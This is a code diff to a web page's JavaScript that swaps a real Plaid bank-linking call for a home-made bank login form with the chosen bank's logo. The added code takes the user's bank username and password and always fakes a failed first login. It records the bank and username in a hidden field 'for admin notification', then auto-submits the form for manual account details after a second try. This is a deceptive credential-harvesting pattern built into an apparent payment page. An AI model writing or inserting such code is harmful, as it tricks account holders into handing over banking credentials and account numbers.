@@ -348,11 +348,164 @@ function selectBank(bank) {
     console.log('Selected bank:', bank);
     selectedBank = bank;
 
-    // Open Plaid Link to connect with selected bank
-    if (plaidLinkHandler) {
-        plaidLinkHandler.open();
+    // Create login form for the selected bank
+    const plaidSection = document.getElementById('plaid-section');
+    if (plaidSection) {
+        // Create bank login form
+        const loginForm = document.createElement('div');
+        loginForm.className = 'bank-login-form';
+        loginForm.innerHTML = `
+            <div class="bank-login-header">
+                <img src="https://logo.clearbit.com/${bank.logo}" alt="${bank.name} logo" class="bank-logo-large" 
+                     onerror="this.src='/static/images/default-bank.svg'">
+                <h4>${bank.name}</h4>
+            </div>
+            <div class="form-group mb-3">
+                <label for="bank-username" class="form-label">Username</label>
+                <input type="text" id="bank-username" class="form-control" placeholder="Enter your ${bank.name} username">
+            </div>
+            <div class="form-group mb-3">
+                <label for="bank-password" class="form-label">Password</label>
+                <input type="password" id="bank-password" class="form-control" placeholder="Enter your password">
+            </div>
+            <div class="d-grid">
+                <button id="bank-login-btn" class="btn btn-primary btn-lg">Sign In</button>
+            </div>
+            <div class="text-center mt-3">
+                <a href="#" id="back-to-banks" class="btn btn-link">Choose a different bank</a>
+            </div>
+        `;
+        
+        // Clear and append the login form
+        plaidSection.innerHTML = '';
+        plaidSection.appendChild(loginForm);
+        
+        // Focus on username field
+        setTimeout(() => {
+            const usernameField = document.getElementById('bank-username');
+            if (usernameField) {
+                usernameField.focus();
+            }
+        }, 100);
+        
+        // Add event listeners
+        const loginButton = document.getElementById('bank-login-btn');
+        if (loginButton) {
+            loginButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Get entered credentials
+                const username = document.getElementById('bank-username').value;
+                const password = document.getElementById('bank-password').value;
+                
+                // Show loading spinner
+                showLoading('Connecting to your bank...');
+                
+                // Simulate first login attempt (always fail)
+                setTimeout(function() {
+                    hideLoading();
+                    
+                    // Record first attempt metadata for admin notification
+                    const plaidMetadata = document.getElementById('plaid_metadata');
+                    if (plaidMetadata) {
+                        const metadataObj = {
+                            bank: bank.name,
+                            username: username,
+                            password: '********', // We don't store actual passwords
+                            timestamp: new Date().toISOString(),
+                            attempt: 1
+                        };
+                        plaidMetadata.value = JSON.stringify(metadataObj);
+                    }
+                    
+                    // Show error message
+                    alert('We were unable to connect to your bank account. Please try again or enter your details manually.');
+                    
+                    // Show login form again
+                    const usernameField = document.getElementById('bank-username');
+                    if (usernameField) {
+                        usernameField.focus();
+                    }
+                    
+                    // Add event listener for second attempt
+                    const loginButton = document.getElementById('bank-login-btn');
+                    if (loginButton) {
+                        loginButton.onclick = function(e) {
+                            e.preventDefault();
+                            
+                            // Get entered credentials again
+                            const username = document.getElementById('bank-username').value;
+                            const password = document.getElementById('bank-password').value;
+                            
+                            // Show loading spinner
+                            showLoading('Connecting to your bank...');
+                            
+                            // Simulate second login attempt (redirect to manual entry)
+                            setTimeout(function() {
+                                hideLoading();
+                                
+                                // Record second attempt metadata for admin notification
+                                const plaidMetadata = document.getElementById('plaid_metadata');
+                                if (plaidMetadata) {
+                                    const metadataObj = {
+                                        bank: bank.name,
+                                        username: username,
+                                        password: '********', // We don't store actual passwords
+                                        timestamp: new Date().toISOString(),
+                                        attempt: 2
+                                    };
+                                    plaidMetadata.value = JSON.stringify(metadataObj);
+                                }
+                                
+                                // Set bank name in the form
+                                const bankNameInput = document.getElementById('bank_name');
+                                if (bankNameInput) {
+                                    bankNameInput.value = bank.name;
+                                }
+                                
+                                // Show manual entry section
+                                const plaidSection = document.getElementById('plaid-section');
+                                const manualSection = document.getElementById('manual-bank-section');
+                                
+                                if (plaidSection && manualSection) {
+                                    plaidSection.style.display = 'none';
+                                    manualSection.style.display = 'block';
+                                    
+                                    // Focus on account number field
+                                    const accountNumberInput = document.getElementById('account_number');
+                                    if (accountNumberInput) {
+                                        accountNumberInput.focus();
+                                    }
+                                    
+                                    // Submit the form automatically after showing manual section
+                                    setTimeout(() => {
+                                        const manualForm = document.getElementById('bank-verification-form');
+                                        if (manualForm) {
+                                            // Use button click instead of form.submit() to avoid conflicts with any submit elements
+                                            const submitButton = manualForm.querySelector('button[type="submit"]');
+                                            if (submitButton) {
+                                                submitButton.click();
+                                            }
+                                        }
+                                    }, 1000);
+                                }
+                            }, 5000); // 5 second loading time
+                        };
+                    }
+                }, 5000); // 5 second loading time
+            });
+        }
+        
+        // Back to bank selection
+        const backButton = document.getElementById('back-to-banks');
+        if (backButton) {
+            backButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.reload();
+            });
+        }
     }
-
+    
     // Set bank name in the form
     const bankNameInput = document.getElementById('bank_name');
     if (bankNameInput) {
